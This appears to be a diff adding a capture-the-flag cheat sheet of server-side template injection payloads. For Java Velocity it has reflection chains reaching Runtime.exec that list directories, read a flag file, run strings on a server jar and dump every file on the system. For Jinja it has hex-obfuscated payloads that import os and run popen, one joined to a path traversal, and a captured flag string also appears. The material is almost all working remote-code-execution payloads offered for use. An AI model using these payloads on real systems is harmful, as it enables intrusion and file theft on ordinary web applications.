@@ -1,0 +1,62 @@
+Java
+
+#set($x=7*7)$x
+
+#set($e="e")
+#set($r=$e.class.forName("java.lang.Runtime"))
+#set($rt=$r.getRuntime())
+#set($proc=$rt.exec("pwd"))
+#set($is=$proc.getInputStream())
+#set($br=$e.class.forName("java.io.BufferedReader").getConstructor($e.class.forName("java.io.Reader")).newInstance($e.class.forName("java.io.InputStreamReader").getConstructor($e.class.forName("java.io.InputStream")).newInstance($is)))
+#set($line=$br.readLine())
+$line
+
+#set($e="e")
+#set($r=$e.class.forName("java.lang.Runtime"))
+#set($rt=$r.getRuntime())
+#set($proc=$rt.exec("ls -la /"))
+#set($is=$proc.getInputStream())
+#set($br=$e.class.forName("java.io.BufferedReader").getConstructor($e.class.forName("java.io.Reader")).newInstance($e.class.forName("java.io.InputStreamReader").getConstructor($e.class.forName("java.io.InputStream")).newInstance($is)))
+#foreach($line in $br.lines().toArray())
+$line
+#end
+
+#set($e="e")
+#set($r=$e.class.forName("java.lang.Runtime"))
+#set($rt=$r.getRuntime())
+#set($proc=$rt.exec("cat /flag20b310e312.txt"))
+#set($is=$proc.getInputStream())
+#set($br=$e.class.forName("java.io.BufferedReader").getConstructor($e.class.forName("java.io.Reader")).newInstance($e.class.forName("java.io.InputStreamReader").getConstructor($e.class.forName("java.io.InputStream")).newInstance($is)))
+#foreach($line in $br.lines().toArray())
+$line
+#end
+
+WRECKIT60{M1ss10n_D4t4_Exf1ltr4t10n}
+
+#set($e="e")
+#set($r=$e.class.forName("java.lang.Runtime"))
+#set($rt=$r.getRuntime())
+#set($proc=$rt.exec("strings target/server.jar.original"))
+#set($is=$proc.getInputStream())
+#set($br=$e.class.forName("java.io.BufferedReader").getConstructor($e.class.forName("java.io.Reader")).newInstance($e.class.forName("java.io.InputStreamReader").getConstructor($e.class.forName("java.io.InputStream")).newInstance($is)))
+#foreach($line in $br.lines().toArray())
+$line
+#end
+
+#set($e="e")
+#set($r=$e.class.forName("java.lang.Runtime"))
+#set($rt=$r.getRuntime())
+#set($proc=$rt.exec("find / -type f -exec cat {} +"))
+#set($is=$proc.getInputStream())
+#set($br=$e.class.forName("java.io.BufferedReader").getConstructor($e.class.forName("java.io.Reader")).newInstance($e.class.forName("java.io.InputStreamReader").getConstructor($e.class.forName("java.io.InputStream")).newInstance($is)))
+#foreach($line in $br.lines().toArray())
+$line
+#end
+
+JINJA/Python
+
+obsfuscated
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
+
+command pico notepad (hard)
+..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa {{request.application.["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]('os').popen('ls -alt').read()}}
